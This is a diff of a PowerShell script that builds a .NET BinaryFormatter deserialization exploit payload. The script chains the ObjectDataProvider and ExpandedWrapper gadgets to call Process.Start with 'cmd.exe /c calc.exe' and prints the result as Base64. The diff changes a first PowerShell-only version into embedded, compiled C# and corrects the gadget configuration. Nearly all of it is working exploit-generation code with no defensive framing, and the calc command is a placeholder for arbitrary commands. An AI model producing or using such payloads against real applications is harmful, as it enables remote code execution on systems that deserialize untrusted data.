@@ -1,33 +1,50 @@
-# --- PowerShell Payload Generator for .NET BinaryFormatter ---
-
-# 1. Load the necessary assembly for ObjectDataProvider
+# Load the required assemblies
 Add-Type -AssemblyName PresentationFramework
+Add-Type -AssemblyName System.Data.Services
 
-# 2. Create the ObjectDataProvider instance (the "gadget")
-$odp = New-Object System.Windows.Data.ObjectDataProvider
+# Define the C# payload generator
+$csharpCode = @"
+using System;
+using System.IO;
+using System.Runtime.Serialization.Formatters.Binary;
+using System.Windows.Data;
+using System.Data.Services.Internal;
 
-# 3. Configure the gadget to execute a command
-#    - The ObjectInstance is a Process object.
-#    - The MethodName "Start" will be called on that Process object.
-#    - MethodParameters are the arguments for Process.Start (the executable and its arguments).
-$odp.ObjectInstance = New-Object System.Diagnostics.Process
-$odp.MethodName = "Start"
-$odp.MethodParameters = @("cmd.exe", "/c calc.exe")
+public class PayloadGenerator
+{
+    public static string Generate()
+    {
+        // 1. Create the ObjectDataProvider
+        ObjectDataProvider odp = new ObjectDataProvider();
+        
+        // 2. Set the ObjectInstance to the Process Type (for static method invocation)
+        odp.ObjectInstance = typeof(System.Diagnostics.Process);
+        
+        // 3. Add MethodParameters BEFORE setting MethodName (Order is critical)
+        odp.MethodParameters.Add("cmd.exe");
+        odp.MethodParameters.Add("/c calc.exe");
+        
+        // 4. Set the MethodName
+        odp.MethodName = "Start";
 
-# 4. Serialize the gadget using BinaryFormatter
-$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
-$memStream = New-Object System.IO.MemoryStream
+        // 5. Wrap in ExpandedWrapper to make it serializable
+        ExpandedWrapper<ObjectDataProvider, object> wrapper = new ExpandedWrapper<ObjectDataProvider, object>();
+        wrapper.ExpandedElement = odp;
 
-# Serialize the object graph into the memory stream
-$formatter.Serialize($memStream, $odp)
+        // 6. Serialize to Base64
+        BinaryFormatter formatter = new BinaryFormatter();
+        using (MemoryStream ms = new MemoryStream())
+        {
+            formatter.Serialize(ms, wrapper);
+            return Convert.ToBase64String(ms.ToArray());
+        }
+    }
+}
+"@
 
-# 5. Convert the serialized bytes to a Base64 string for easy transport
-$bytes = $memStream.ToArray()
-$base64Payload = [System.Convert]::ToBase64String($bytes)
+# Compile the C# code and execute it
+Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies PresentationFramework, System.Data.Services
+$base64Payload = [PayloadGenerator]::Generate()
 
-# 6. Output the payload
 Write-Host "Base64 Payload:"
 Write-Host $base64Payload
-
-# Clean up
-$memStream.Dispose()
